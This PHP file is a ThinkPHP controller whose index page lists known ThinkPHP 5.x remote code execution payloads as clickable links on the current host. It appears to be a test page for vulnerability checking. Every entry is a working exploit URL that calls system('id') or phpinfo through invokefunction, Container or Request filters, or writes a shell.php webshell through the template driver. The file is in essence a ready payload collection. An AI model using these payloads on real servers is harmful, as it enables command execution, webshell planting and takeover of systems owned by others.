<?php
namespace app\index\controller;

class Index {
	public function index() {
		$pls = [
			"\\think\\Request/input:phpinfo" => "?s=index/\\think\\Request/input&filter=phpinfo&data=1",
			"\\think\\Request/input:system" => "?s=index/\\think\\Request/input&filter=system&data=id",

			"\\think\\template\\driver\\file/write:phpinfo" => "?s=index/\\think\\template\\driver\\file/write&cacheFile=shell.php&content=%3C?php%20phpinfo();?%3E",

			"\\think\\view\driver\Php/display:phpinfo" => "?s=index/\\think\\view\driver\Php/display&content=%3C?php%20phpinfo();?%3E",

			"\\think\\app/invokefunction:phpinfo" => "?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
			"\\think\\app/invokefunction:system" => "?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id",

			"\\think\\Container/invokefunction:phpinfo" => "?s=index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
			"\\think\\Container/invokefunction:system" => "?s=index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id",
		];
		$res = "<style>a{font-size:50px}</style><h1>Test</h1>";
		$http_type = ((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on') || (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https')) ? 'https://' : 'http://';
		foreach ($pls as $key => $value) {
			$res .= "<a href=\"{$http_type}{$_SERVER['HTTP_HOST']}/{$value}\">{$key}</a><br /><br />";
		}
		return $res;
	}
}
